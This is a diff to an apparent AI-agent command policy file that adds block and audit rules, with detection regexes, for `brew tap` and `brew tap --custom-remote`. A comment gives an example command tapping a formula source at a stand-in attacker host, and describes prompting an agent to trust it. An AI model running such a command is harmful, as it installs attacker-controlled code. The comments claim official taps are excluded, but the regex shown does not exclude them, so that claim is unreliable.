@@ -235,6 +235,45 @@ rules:
     decision: "AUDIT"
     reason: "Yarn/pnpm package install flagged for supply-chain review."
 
+  # === BLOCK: brew tap with --custom-remote (arbitrary URL tap source) ===
+  #
+  # `brew tap --custom-remote` points a tap at any HTTPS/git URL, bypassing
+  # GitHub entirely. An attacker can host a malicious formula server and direct
+  # an AI agent to add it as a trusted Homebrew source. Any subsequent
+  # `brew install` from that tap executes attacker-controlled code.
+  #
+  # This is strictly more dangerous than a standard third-party GitHub tap:
+  #   brew tap attacker/tools --custom-remote https://attacker.com/homebrew
+  #
+  # Taxonomy: supply-chain/dependency-confusion/non-standard-registry
+  # MITRE T1195.001 — Supply Chain Compromise: Compromise Software Dependencies
+  # OWASP LLM08 — Excessive Agency
+  - id: "sc-block-brew-tap-custom-remote"
+    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
+    match:
+      command_regex: "(^|&&|;|\\|\\s*)\\s*brew\\s+tap\\s+.*--custom-remote"
+    decision: "BLOCK"
+    confidence: 0.97
+    reason: "brew tap --custom-remote adds a Homebrew formula source from an arbitrary URL, bypassing GitHub. Attacker-controlled taps execute code during brew install. MITRE T1195.001."
+
+  # === AUDIT: brew tap (third-party tap addition) ===
+  #
+  # `brew tap <user>/<repo>` clones a GitHub repo as a new Homebrew formula
+  # source. Third-party taps can serve trojaned packages under any name.
+  # Official Homebrew taps (homebrew/*, microsoft/*, hashicorp/*) are
+  # excluded — they are trust-anchored at github.com/homebrew and
+  # verified by the Homebrew project.
+  #
+  # Taxonomy: supply-chain/dependency-confusion/non-standard-registry
+  # MITRE T1195.001 — Supply Chain Compromise
+  - id: "sc-audit-brew-tap"
+    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
+    match:
+      command_regex: "(^|&&|;|\\|\\s*)\\s*brew\\s+tap(\\s|$)"
+    decision: "AUDIT"
+    confidence: 0.85
+    reason: "brew tap adds a new Homebrew formula repository — introduces a new software source. Third-party taps can serve trojaned packages. Official taps (homebrew/*, microsoft/*, hashicorp/*) are safe; others require review. MITRE T1195.001."
+
   - id: "sc-audit-brew-install"
     taxonomy: "supply-chain/package-install/standard-package-install"
     match:
